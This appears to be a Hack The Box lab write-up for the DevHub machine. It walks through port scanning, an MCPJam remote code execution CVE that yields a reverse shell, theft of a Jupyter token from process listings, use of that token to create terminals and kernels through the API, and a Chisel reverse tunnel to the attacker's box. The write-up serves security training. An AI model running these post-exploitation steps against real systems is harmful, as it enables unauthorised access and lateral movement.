# HTB: DevHub (Medium)

> **Hack The Box Writeup**
>
> **Machine:** DevHub  
> **Difficulty:** Medium  
> **Operating System:** Linux  
> **Date Solved:** 2026-05-24  

---

# Executive Summary

| Field                | Value                        |
| -------------------- | ---------------------------- |
| Machine Name         | DevHub                       |
| OS                   | Linux                        |
| Difficulty           | Medium                       |
| Initial Access       | MCPJam Remote Code Execution |
| Vulnerability        | CVE-2026-23744               |
| Credential Access    | Exposed Jupyter Token        |
| Privilege Escalation | JupyterLab Access            |

---

# Attack Path

```text
Reconnaissance
    ↓
Web Enumeration
    ↓
MCPJam Discovery
    ↓
Version Identification
    ↓
CVE-2026-23744 RCE
    ↓
Shell as mcp-dev
    ↓
Process Enumeration
    ↓
Exposed Jupyter Token
    ↓
Jupyter API Access
    ↓
Kernel & Terminal Creation
    ↓
Port Forwarding with Chisel
    ↓
JupyterLab Access as analyst
    ↓
Internal Service Enumeration
```

---

# 1. Enumeration & Reconnaissance

## Nmap Scan

```bash
sudo nmap -sC -sV -sS -T5 10.129.245.216 -p-
```

### Results

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
6274/tcp open  unknown
```

Interesting findings:

* SSH service exposed on port 22
* Nginx web server on port 80
* Unknown service running on port 6274

Add the target hostname:

```bash
echo "10.129.245.216 devhub.htb" | sudo tee -a /etc/hosts
```

---

# 2. Web Enumeration

Browse to:

```text
http://devhub.htb
```

The application reveals an MCPJam deployment.

![DevHub Homepage](image.png)

Version enumeration reveals a vulnerable release.

Research identifies:

```text
CVE-2026-23744
```

A public proof-of-concept is available:

```text
https://github.com/boroeurnprach/CVE-2026-23744-PoC
```

---

# 3. Initial Access

Exploit the vulnerable MCPJam instance using the public proof-of-concept.

After successful exploitation, a reverse shell is obtained.

Verify access:

```bash
whoami
```

Output:

```text
mcp-dev
```

---

# 4. Local Enumeration

Inspect listening services:

```bash
ss -tunlp
```

Output:

```text
127.0.0.1:8888
127.0.0.1:5000
0.0.0.0:6274
```

Interesting observations:

* JupyterLab running locally on port 8888
* Additional internal service on port 5000
* MCPJam service listening on port 6274

Enumerate processes:

```bash
ps -aux | grep analyst
```

Output:

```text
analyst     1096 ... jupyter-lab --ip=127.0.0.1 --port=8888
```

The process arguments expose a valid Jupyter token.

---

# 5. Jupyter Token Discovery

Token discovered:

```text
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Enumerate notebook contents:

```bash
curl -s \
-H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
http://127.0.0.1:8888/api/contents
```

Response:

```text
quarterly_analysis.ipynb
```

---

# 6. Notebook Enumeration

Retrieve notebook contents:

```bash
curl -s \
-H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
"http://127.0.0.1:8888/api/contents/quarterly_analysis.ipynb"
```

The notebook contains internal analytics code.

---

# 7. Jupyter API Abuse

Verify terminal creation:

```bash
curl -s -X POST \
-H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
http://127.0.0.1:8888/api/terminals
```

Response:

```text
{"name":"1"}
```

Verify kernel creation:

```bash
curl -s -X POST \
-H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
-H "Content-Type: application/json" \
-d '{"name":"python3"}' \
http://127.0.0.1:8888/api/kernels
```

Response:

```text
{"id":"0391e147-51fd-4dea-a79e-f3f585f37eb7"}
```

This confirms full access to the Jupyter API.

---

# 8. Port Forwarding

Transfer Chisel to the target.

On the attack box:

```bash
./chisel server --reverse -p 8000
```

On the target:

```bash
/tmp/chisel client 10.10.15.115:8000 R:8888:127.0.0.1:8888
```

Access JupyterLab locally:

```text
http://127.0.0.1:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

JupyterLab loads successfully.

---

# 9. Internal Service Enumeration

Open a terminal within JupyterLab.

Verify access:

```bash
whoami
id
```

Inspect the internal service:

```bash
cat /opt/opsmcp/server.py
```

At this point the provided notes end.

---

# Key Findings

| Finding                   | Impact                       |
| ------------------------- | ---------------------------- |
| MCPJam vulnerable version | Remote Code Execution        |
| CVE-2026-23744            | Initial access               |
| Exposed Jupyter token     | Analyst account compromise   |
| Jupyter API access        | Terminal and kernel creation |
| Chisel port forwarding    | Access to internal services  |
| Internal MCP service      | Further attack surface       |

---

# Lessons Learned

* Developer tooling frequently exposes sensitive functionality.
* Jupyter tokens should never be exposed through process listings.
* Internal-only services become accessible after initial compromise.
* Port forwarding remains a powerful post-exploitation technique.
* Enumeration of local services is critical after obtaining a foothold.

---

**Machine:** DevHub  
**Difficulty:** Medium  
**Status:** Owned  
